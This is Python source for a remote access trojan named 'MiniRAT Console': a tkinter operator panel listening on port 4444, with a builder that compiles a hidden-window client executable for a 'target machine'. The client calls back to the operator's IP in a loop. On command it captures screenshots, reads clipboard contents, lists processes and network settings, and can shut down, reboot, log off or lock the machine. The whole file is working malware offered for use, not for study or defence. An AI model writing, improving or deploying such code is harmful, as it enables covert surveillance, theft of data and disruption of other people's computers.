import tkinter as tk
from tkinter import Menu, simpledialog, messagebox, Listbox
import socket
import threading
from io import BytesIO
from PIL import Image, ImageTk
import base64
import os
import subprocess
import sys
import shutil
import webbrowser

PORT = 4444
clients = []
client_listbox = None

def build_client():
    server_ip = simpledialog.askstring("Server IP", "Enter Server IP for clients to connect:")
    if not server_ip:
        messagebox.showerror("Error", "Server IP required.")
        return

    with open("config.txt", "w") as f:
        f.write(server_ip)

    client_code = f'''
import socket
import time
import subprocess
import os
import platform
import webbrowser
from io import BytesIO
from PIL import ImageGrab
import base64

PORT = {PORT}

def read_server_ip():
    try:
        with open("config.txt", "r") as f:
            return f.read().strip()
    except:
        return None

def capture_screenshot():
    img = ImageGrab.grab()
    buf = BytesIO()
    img.save(buf, format="JPEG", quality=50)
    b64_img = base64.b64encode(buf.getvalue()).decode()
    return b64_img

def main():
    while True:
        server_ip = read_server_ip()
        if not server_ip:
            time.sleep(5)
            continue
        try:
            s = socket.socket()
            s.connect((server_ip, PORT))
            while True:
                cmd = s.recv(1024).decode(errors="ignore")
                if not cmd:
                    break

                if cmd.startswith("msg "):
                    try:
                        import tkinter as tk
                        from tkinter import messagebox
                        root = tk.Tk()
                        root.withdraw()
                        messagebox.showwarning("Warning", cmd[4:])
                        root.destroy()
                        s.sendall(b"Warning shown")
                    except Exception as e:
                        s.sendall(f"Failed to show warning: {{e}}".encode())

                elif cmd.startswith("open "):
                    url = cmd[5:]
                    webbrowser.open(url)
                    s.sendall(b"Website opened")

                elif cmd == "ipconfig":
                    if os.name == "nt":
                        output = subprocess.getoutput("ipconfig")
                    else:
                        output = subprocess.getoutput("ifconfig")
                    s.sendall(output.encode(errors="ignore"))

                elif cmd == "shutdown":
                    try:
                        if os.name == "nt":
                            subprocess.run("shutdown /s /t 5", shell=True)
                        else:
                            subprocess.run("shutdown now", shell=True)
                        s.sendall(b"Shutdown initiated")
                    except Exception as e:
                        s.sendall(f"Shutdown failed: {{e}}".encode())

                elif cmd == "restart":
                    try:
                        if os.name == "nt":
                            subprocess.run("shutdown /r /t 5", shell=True)
                        else:
                            subprocess.run("reboot", shell=True)
                        s.sendall(b"Restart initiated")
                    except Exception as e:
                        s.sendall(f"Restart failed: {{e}}".encode())

                elif cmd == "logoff":
                    try:
                        if os.name == "nt":
                            subprocess.run("shutdown /l", shell=True)
                        else:
                            subprocess.run("pkill -KILL -u $USER", shell=True)
                        s.sendall(b"Logoff initiated")
                    except Exception as e:
                        s.sendall(f"Logoff failed: {{e}}".encode())

                elif cmd == "exit":
                    s.sendall(b"Exiting client")
                    s.close()
                    return

                elif cmd == "calc":
                    if os.name == "nt":
                        os.system("start calc.exe")
                    else:
                        os.system("gnome-calculator &")
                    s.sendall(b"Calculator opened")

                elif cmd == "notepad":
                    if os.name == "nt":
                        os.system("start notepad.exe")
                    else:
                        os.system("gedit &")
                    s.sendall(b"Notepad opened")

                elif cmd == "tasklist":
                    if os.name == "nt":
                        output = subprocess.getoutput("tasklist")
                    else:
                        output = subprocess.getoutput("ps aux")
                    s.sendall(output.encode(errors="ignore"))

                elif cmd == "screenshot":
                    b64_img = capture_screenshot()
                    s.sendall(b64_img.encode())

                elif cmd == "get_clipboard":
                    try:
                        import pyperclip
                        content = pyperclip.paste()
                    except:
                        content = "Clipboard access not available"
                    s.sendall(content.encode(errors="ignore"))

                elif cmd == "clear_clipboard":
                    try:
                        import pyperclip
                        pyperclip.copy("")
                        s.sendall(b"Clipboard cleared")
                    except:
                        s.sendall(b"Failed to clear clipboard")

                elif cmd == "lock":
                    if os.name == "nt":
                        os.system("rundll32.exe user32.dll,LockWorkStation")
                        s.sendall(b"Workstation locked")
                    else:
                        s.sendall(b"Lock not supported on this OS")

                elif cmd == "beep":
                    if os.name == "nt":
                        import winsound
                        winsound.Beep(1000, 500)
                        s.sendall(b"Beep played")
                    else:
                        s.sendall(b"Beep not supported")

                elif cmd == "cmd":
                    if os.name == "nt":
                        os.system("start cmd.exe")
                    else:
                        os.system("gnome-terminal &")
                    s.sendall(b"Command prompt opened")

                elif cmd == "sysinfo":
                    info = f"System: {{platform.system()}}, Release: {{platform.release()}}, Version: {{platform.version()}}"
                    s.sendall(info.encode())

                elif cmd.startswith("ping "):
                    addr = cmd[5:]
                    if os.name == "nt":
                        output = subprocess.getoutput(f"ping -n 4 {{addr}}")
                    else:
                        output = subprocess.getoutput(f"ping -c 4 {{addr}}")
                    s.sendall(output.encode(errors="ignore"))

                elif cmd == "mute":
                    s.sendall(b"Mute command received (mock)")

                else:
                    s.sendall(b"Unknown command")
        except:
            time.sleep(5)

if __name__ == "__main__":
    main()
'''

    with open("client.py", "w") as f:
        f.write(client_code)

    try:
        for folder in ["build", "dist"]:
            if os.path.isdir(folder):
                shutil.rmtree(folder)
        if os.path.exists("client.spec"):
            os.remove("client.spec")

        cmd = [sys.executable, "-m", "PyInstaller", "--onefile", "--noconsole", "client.py"]
        subprocess.check_call(cmd)

        messagebox.showinfo("Client Built", "client.py and client.exe created in 'dist' folder! Run client.exe on target machine.")
    except Exception as e:
        messagebox.showerror("Build Error", f"Failed to build exe:\n{e}")

def remove_client(ip):
    global clients
    for i, (c, a) in enumerate(clients):
        if a[0] == ip:
            client_listbox.delete(i)
            clients.pop(i)
            break

def handle_client(conn, addr):
    ip = addr[0]
    clients.append((conn, addr))
    client_listbox.insert(tk.END, ip)
    try:
        while True:
            data = conn.recv(4096)
            if not data:
                break
            text = data.decode(errors='ignore').strip()
            print(f"[{ip}] {text}")
    except Exception as e:
        print(f"Client {ip} error:", e)
    finally:
        conn.close()
        remove_client(ip)
        print(f"Client {ip} disconnected")

def accept_clients(server):
    while True:
        conn, addr = server.accept()
        threading.Thread(target=handle_client, args=(conn, addr), daemon=True).start()

def start_server():
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind(("0.0.0.0", PORT))
    server.listen()
    threading.Thread(target=accept_clients, args=(server,), daemon=True).start()
    print(f"Listening on port {PORT}...")

def send_command_to_selected(cmd):
    try:
        sel = client_listbox.curselection()
        if not sel:
            messagebox.showinfo("No client", "Select a client first")
            return
        idx = sel[0]
        conn, addr = clients[idx]
        conn.sendall(cmd.encode())
    except Exception as e:
        messagebox.showerror("Send Error", str(e))

def prompt_msg():
    msg = simpledialog.askstring("Send Warning", "Enter warning message to show:")
    if msg:
        send_command_to_selected(f"msg {msg}")

def prompt_open_website():
    url = simpledialog.askstring("Open Website", "Enter URL:")
    if url:
        send_command_to_selected(f"open {url}")

def prompt_ping():
    host = simpledialog.askstring("Ping Host", "Enter IP or hostname to ping:")
    if host:
        send_command_to_selected(f"ping {host}")

def on_right_click(event):
    sel = client_listbox.curselection()
    if not sel:
        return
    menu = Menu(root, tearoff=0)

    menu.add_command(label="ipconfig", command=lambda: send_command_to_selected("ipconfig"))
    menu.add_command(label="Send Warning Message", command=prompt_msg)
    menu.add_command(label="Open Website", command=prompt_open_website)
    menu.add_command(label="Shutdown", command=lambda: send_command_to_selected("shutdown"))
    menu.add_command(label="Restart", command=lambda: send_command_to_selected("restart"))
    menu.add_command(label="Logoff", command=lambda: send_command_to_selected("logoff"))
    menu.add_command(label="Exit Client", command=lambda: send_command_to_selected("exit"))
    menu.add_command(label="Open Calculator", command=lambda: send_command_to_selected("calc"))
    menu.add_command(label="Open Notepad", command=lambda: send_command_to_selected("notepad"))
    menu.add_command(label="List Tasks", command=lambda: send_command_to_selected("tasklist"))
    menu.add_command(label="Capture Screenshot", command=lambda: send_command_to_selected("screenshot"))
    menu.add_command(label="Get Clipboard Content", command=lambda: send_command_to_selected("get_clipboard"))
    menu.add_command(label="Clear Clipboard", command=lambda: send_command_to_selected("clear_clipboard"))
    menu.add_command(label="Lock Workstation", command=lambda: send_command_to_selected("lock"))
    menu.add_command(label="Play Beep Sound", command=lambda: send_command_to_selected("beep"))
    menu.add_command(label="Open Command Prompt", command=lambda: send_command_to_selected("cmd"))
    menu.add_command(label="System Info", command=lambda: send_command_to_selected("sysinfo"))
    menu.add_command(label="Ping Host", command=prompt_ping)
    menu.add_command(label="Mute (mock)", command=lambda: send_command_to_selected("mute"))

    menu.post(event.x_root, event.y_root)

root = tk.Tk()
root.title("MiniRAT Console")
root.geometry("500x400")

client_listbox = Listbox(root)
client_listbox.pack(fill=tk.BOTH, expand=True)

menubar = Menu(root)
filemenu = Menu(menubar, tearoff=0)
filemenu.add_command(label="Build Client", command=build_client)
menubar.add_cascade(label="File", menu=filemenu)
root.config(menu=menubar)

client_listbox.bind("<Button-3>", on_right_click)

start_server()
root.mainloop()
